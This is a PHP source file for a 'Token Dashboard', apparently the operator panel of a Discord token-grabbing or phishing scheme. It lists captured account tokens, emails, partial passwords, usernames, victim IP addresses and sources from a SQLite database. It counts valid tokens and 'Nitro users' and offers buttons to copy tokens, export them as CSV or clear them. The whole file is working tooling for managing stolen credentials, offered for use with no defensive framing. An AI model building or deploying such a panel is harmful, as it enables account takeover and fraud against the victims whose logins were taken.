<?php
// view_tokens.php - Dashboard to view captured tokens
// !!! PASSWORD PROTECT THIS !!!

// === IP WHITELIST (optional) ===
$allowed_ips = ['YOUR_IP_HERE', '127.0.0.1'];
$user_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
if (!in_array($user_ip, $allowed_ips) && !in_array('127.0.0.1', $allowed_ips)) {
    die('Access denied.');
}

// === DATABASE ===
$db = new PDO('sqlite:tokens.db');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Get stats
$total = $db->query("SELECT COUNT(*) FROM tokens")->fetchColumn();
$valid = $db->query("SELECT COUNT(*) FROM tokens WHERE valid = 1")->fetchColumn();
$nitro = $db->query("SELECT COUNT(*) FROM tokens WHERE nitro = 1")->fetchColumn();

// Get recent entries
$result = $db->query("SELECT * FROM tokens ORDER BY timestamp DESC LIMIT 100");
$rows = $result->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Token Dashboard</title>
    <style>
        body { background: #1e1f22; color: #f2f3f5; font-family: Arial, sans-serif; padding: 20px; }
        .stats { display: flex; gap: 20px; margin-bottom: 24px; flex-wrap: wrap; }
        .stat-box { background: #2b2d31; padding: 16px 24px; border-radius: 6px; border-left: 3px solid #5865f2; }
        .stat-box .num { font-size: 28px; font-weight: bold; color: #fff; }
        .stat-box .label { color: #b5bac1; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { background: #2b2d31; text-align: left; padding: 10px 12px; color: #b5bac1; font-weight: 600; }
        td { padding: 8px 12px; border-bottom: 1px solid #2b2d31; word-break: break-all; }
        tr:hover { background: #2b2d31; }
        .valid-yes { color: #4caf50; font-weight: bold; }
        .valid-no { color: #f44336; }
        .nitro-yes { color: #ff6b9d; }
        .token-cell { max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-family: monospace; font-size: 12px; }
        .copy-btn { background: #5865f2; border: none; color: white; padding: 2px 8px; border-radius: 3px; cursor: pointer; font-size: 11px; }
        .copy-btn:hover { background: #4752c4; }
        .refresh-btn { background: #5865f2; border: none; color: white; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-bottom: 16px; }
        .refresh-btn:hover { background: #4752c4; }
        .export-btn { background: #2b2d31; border: 1px solid #3f4147; color: white; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-left: 8px; }
        .export-btn:hover { background: #3f4147; }
        .actions { margin-bottom: 16px; display: flex; gap: 8px; flex-wrap: wrap; }
    </style>
</head>
<body>
    <h1>🔓 Token Dashboard</h1>
    
    <div class="stats">
        <div class="stat-box"><div class="num"><?= $total ?></div><div class="label">Total Captures</div></div>
        <div class="stat-box"><div class="num" style="color:#4caf50;"><?= $valid ?></div><div class="label">Valid Tokens</div></div>
        <div class="stat-box"><div class="num" style="color:#ff6b9d;"><?= $nitro ?></div><div class="label">Nitro Users</div></div>
    </div>

    <div class="actions">
        <button class="refresh-btn" onclick="location.reload()">↻ Refresh</button>
        <button class="export-btn" onclick="exportCSV()">📥 Export CSV</button>
        <button class="export-btn" onclick="clearAll()" style="border-color:#f44336;color:#f44336;">🗑️ Clear All</button>
    </div>

    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>Token</th>
                <th>Email/Pass</th>
                <th>User</th>
                <th>Valid</th>
                <th>Nitro</th>
                <th>IP</th>
                <th>Source</th>
                <th>Time</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($rows as $row): ?>
            <tr>
                <td><?= $row['id'] ?></td>
                <td class="token-cell" title="<?= htmlspecialchars($row['token'] ?? '') ?>">
                    <?= $row['token'] ? substr($row['token'], 0, 20) . '...' : '-' ?>
                    <?php if ($row['token']): ?>
                        <button class="copy-btn" onclick="copyToken('<?= addslashes($row['token']) ?>')">Copy</button>
                    <?php endif; ?>
                </td>
                <td>
                    <?= $row['email'] ? htmlspecialchars($row['email']) : '-' ?>
                    <?= $row['password'] ? ' / ' . htmlspecialchars(substr($row['password'], 0, 10)) . '...' : '' ?>
                </td>
                <td><?= htmlspecialchars($row['username'] ?? '-') ?></td>
                <td class="<?= $row['valid'] ? 'valid-yes' : 'valid-no' ?>"><?= $row['valid'] ? '✅' : '❌' ?></td>
                <td class="<?= $row['nitro'] ? 'nitro-yes' : '' ?>"><?= $row['nitro'] ? '⭐' : '-' ?></td>
                <td><?= htmlspecialchars($row['ip'] ?? '-') ?></td>
                <td><?= htmlspecialchars($row['source'] ?? '-') ?></td>
                <td><?= htmlspecialchars($row['timestamp'] ?? '-') ?></td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <script>
        function copyToken(token) {
            navigator.clipboard.writeText(token).then(() => {
                alert('Token copied to clipboard!');
            }).catch(() => {
                // Fallback
                const input = document.createElement('input');
                input.value = token;
                document.body.appendChild(input);
                input.select();
                document.execCommand('copy');
                document.body.removeChild(input);
                alert('Token copied!');
            });
        }

        function exportCSV() {
            window.location.href = 'export.php';
        }

        function clearAll() {
            if (confirm('⚠️ Delete ALL captured data? This cannot be undone.')) {
                window.location.href = 'clear.php';
            }
        }

        // Auto-refresh every 30 seconds
        setTimeout(() => location.reload(), 30000);
    </script>
</body>
</html>